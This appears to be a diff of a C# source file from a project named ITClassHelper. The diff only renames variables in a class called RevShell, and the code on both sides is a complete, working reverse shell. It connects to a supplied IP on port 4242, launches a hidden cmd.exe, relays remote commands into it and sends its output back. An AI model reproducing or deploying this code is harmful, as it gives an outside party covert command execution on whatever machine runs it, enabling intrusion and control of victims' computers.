@@ -7,20 +7,18 @@ namespace ITClassHelper
 {
     internal class RevShell
     {
-        static StreamWriter streamWriter;
+        static StreamWriter sw;
 
         public static void Reverse(string ip)
         {
             using (TcpClient client = new TcpClient(ip, 4242))
             {
-                using (Stream stream = client.GetStream())
+                using (Stream s = client.GetStream())
                 {
-                    using (StreamReader rdr = new StreamReader(stream))
+                    using (StreamReader sr = new StreamReader(s))
                     {
-                        streamWriter = new StreamWriter(stream);
-
-                        StringBuilder strInput = new StringBuilder();
-
+                        sw = new StreamWriter(s);
+                        StringBuilder str = new StringBuilder();
                         Process p = new Process();
                         p.StartInfo.FileName = "cmd.exe";
                         p.StartInfo.CreateNoWindow = true;
@@ -31,12 +29,11 @@ namespace ITClassHelper
                         p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                         p.Start();
                         p.BeginOutputReadLine();
-
                         while (true)
                         {
-                            strInput.Append(rdr.ReadLine());
-                            p.StandardInput.WriteLine(strInput);
-                            strInput.Remove(0, strInput.Length);
+                            str.Append(sr.ReadLine());
+                            p.StandardInput.WriteLine(str);
+                            str.Remove(0, str.Length);
                         }
                     }
                 }
@@ -46,14 +43,13 @@ namespace ITClassHelper
         public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             StringBuilder strOutput = new StringBuilder();
-
             if (!string.IsNullOrEmpty(outLine.Data))
             {
                 try
                 {
                     strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
+                    sw.WriteLine(strOutput);
+                    sw.Flush();
                 }
                 catch { }
             }
